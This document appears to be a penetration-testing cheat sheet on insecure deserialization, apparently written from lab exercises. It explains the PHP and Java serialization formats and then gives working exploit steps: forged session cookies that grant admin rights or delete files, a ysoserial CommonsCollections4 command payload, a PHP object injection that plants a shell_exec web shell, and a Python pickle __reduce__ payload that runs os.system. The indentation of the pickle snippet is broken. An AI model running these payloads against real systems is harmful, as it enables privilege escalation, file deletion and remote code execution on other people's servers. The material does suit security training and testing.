# Insecure deserialization

## Summary
* [Identifying insecure deserialization](#identifying-insecure-deserialization)
	* [PHP serialization format](#php-serialization-format)
	* [Java serialization format](#java-serialization-format)
* [Exploiting insecure deserialization](#exploiting-insecure-deserialization)
	* [Modifying serialized objects](#modifying-serialized-objects)
	* [Modifying serialized data types](#modifying-serialized-data-types)
	* [Exploiting application functionality through insecure deserialization](#exploiting-application-functionality-through-insecure-deserialization)
	* [Arbitrary object injection in PHP & magic methods](#arbitrary-object-injection-in-php--magic-methods)
	* [Exploiting gadeget chains Java deserialization](#exploiting-gadget-chains-java-deserialization-with-apache-commons-library)
	* [Exploiting object injection in PHP & magic methods](#exploiting-object-injection-in-php--magic-methods)
	* [Exploiting pickle deserialization in Python](#exploiting-pickle-deserialization-in-python)


Serialization is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes.

Deserialization is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.

Insecure deserialization is when user-controllable data is deserialized by a website.

## Identifying insecure deserialization
### PHP serialization format
```
> $user->name = "carlos";
> $user->isLoggedIn = true;
	# when serialized
	# O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
	# O:4:"User" - An object with the 4-character class name "User"
	# 2 - the object has 2 attributes
	# s:4:"name" - The key of the first attribute is the 4-character string "name"
	# s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
	# s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
	# b:1 - The value of the second attribute is the boolean value true
> PHP serialization methods are serialize() and unserialize()
```
### Java serialization format
```
> serialized objects always begin with the same bytes
	# "ac ed" in hexadecimal
	# "rO0" in base64
> take note of readObject() as it is used to read and deserialize data
```

## Exploiting insecure deserialization
### Modifying serialized objects
```
> assume an application is vulnerable to privilege escalation through insecure deserialization
> log in into the application with your credentials
> refresh the home page and send the request to the Burp Proxy
> in Burp Proxy, notice that the session cookie appears to be URL and Base64 encoded
> decode the session cookie and notice that it is a serialized PHP object
	# O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
> the admin attribute contains b:0 indicating that the user wiener is not an admin
> change the admin attribute boolean value to 1 and re-encode it to base64 then send the request
	# O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
> notice that the application now contains a link to the admin panel at /admin indicating that the user wiener now has admin privileges
```
### Modifying serialized data types
```
> assume an application is vulnerable to privilege escalation through insecure deserialization
> log in into the application with your credentials
> refresh the home page and send the request to the Burp Proxy
> in Burp Proxy, notice that the session cookie appears to be URL and Base64 encoded
> decode the session cookie and notice that it is a serialized PHP object
	# O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:5:fdfsd;}
> the access token is what determines if a user is an administrator
> update the length of the username attribute to 13 and change the username to administrator
> change the access token to the integer 0 and as this is no longer a string, the double-quotes surrounding the value should also be removed
	# O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
> re-encode the session cookie to base64 then send the request
> notice that the application now contains a link to the admin panel at /admin indicating that the user wiener now has admin privileges
```
### Exploiting application functionality through insecure deserialization
```
> assume an application is vulnerable to delete functionality through insecure deserialization
> log in into the application with your credentials
> click the option to delete your account in /my-account and send the POST request to Burp Proxy
> in Burp Proxy, notice that the session cookie appears to be URL and Base64 encoded
> decode the session cookie and notice that it is a serialized PHP object
	# O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"bugae3pe8eect29ibo4u3ajrmr8nsxwq";s:11:"avatar_link";s:18:"users/gregg/avatar";}
> the avatar_link attribute contains the file path to your avatar
> change the file path attributes pointing to /home/carlos/morale.txt and update the length indicator then reencode it to Base64 and send the request
	# O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"bugae3pe8eect29ibo4u3ajrmr8nsxwq";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
> observe that your account will be deleted along with carlos's morale.txt file
```
### Arbitrary object injection in PHP & magic methods
```
> log in into the application with your credentials and send the request to BurpSuite
> obtain the source code and append (~) to the filename to read its contents
> in the source code, notice the CustomTemplate class contains the __destruct() magic method which will invoke unlink() method on the lock_file_path which will then delete the file on this path
> in Burp Decoder, create a PHP serialized data to create a CustomTemplate object with the lock_file_path attribute set to /home/carlos/morale.txt
	# O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
> encode it to Base64 and and send the request containing the serialized session cookie
> the __destruct() magic method is automatically invoked and will delete Carlos's file
```
### Exploiting gadget chains java deserialization with Apache Commons library
```
> log in into the application with your credentials and send the request to Burp Proxy
> open the ysoserial tool and execute the following command
	# java -jar /path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
> this will generate a Base64-encoded serialized object containing the payload
> URL-encode the generated payload and send the request containing the serialized payload in the cookie header
> observe that the payload executed successfully
```
### Exploiting object injection in PHP & magic methods
```
<?php
class FormSubmit {
public $form_file = 'message.txt';
public $message = '';
public function SaveMessage() {
$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];
	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
}
public function __destruct() {
file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';
}
}
// Leaving this for now... only for debug purposes... do not touch!
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);
$application = new FormSubmit;
$application -> SaveMessage();
?>
```
The PHP code above saves user-supplied data ($message) into a file 'message.txt' ($form_file). Notice at the bottom of the PHP code, there is an unserialize function for $messageDebug which get a user-supplied data from a parameter called 'debug'

We can exploit this by supplying a serialize data into the url using the 'debug' parameter so it can be unserialized and exploited
```
http://example.com?debug=O:10:"FormSubmit":2:{s:9:"form_file";s:8:"test.php";s:7:"message";s:60:"<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>";}
```
The serialized data above gives a new file name for the $form_file instead of using message.txt and we also supply a php code that can gives us remote code execution. Submit the serialized data and navigate to the 'test.php' and test the remote code execution 
		
### Exploiting pickle deserialization in python
Find an injection point and try to submit random value, intercept the request and see if there is any base64 encoded data is being passed.

Base64 in python sometimes could be a hint to us that pickle module is being used in the application

To exploit this, we can supply a malicious pickle serialized data into the injection point and once the data will get deserialize, the malicious payload will be executed
```
	>> import pickle
	   import base64
	   import os

	   class RCE:
	   		def __reduce__(self):
	   		cmd = ('whoami')
	   		return os.system, (cmd,)

	   	if __name__ == '__main__':
	   		pickled = pickle.dumps(RCE())
	   		print(base64.urlsafe_b64encode(pickled))
```
The code above will generate us a malicious serialized data and gaining us a remote code execution
